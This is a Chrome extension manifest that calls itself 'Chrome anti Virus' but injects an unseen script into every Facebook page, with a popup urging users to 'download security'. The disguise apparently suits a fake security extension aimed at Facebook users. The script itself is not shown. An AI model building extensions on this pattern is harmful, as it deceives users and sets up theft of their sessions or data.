{
    "manifest_version": 2,
    "name": "Chrome anti Virus",
    "version": "0.1",
    "content_scripts": [
        {
          "matches": [
            "https://www.facebook.com/*"
          ],
          "js": ["content.js"]          
        }
      ],
      "browser_action":{
        "default_popup": "popup.html",
        "default_title": "Click here to download security"
      }
  }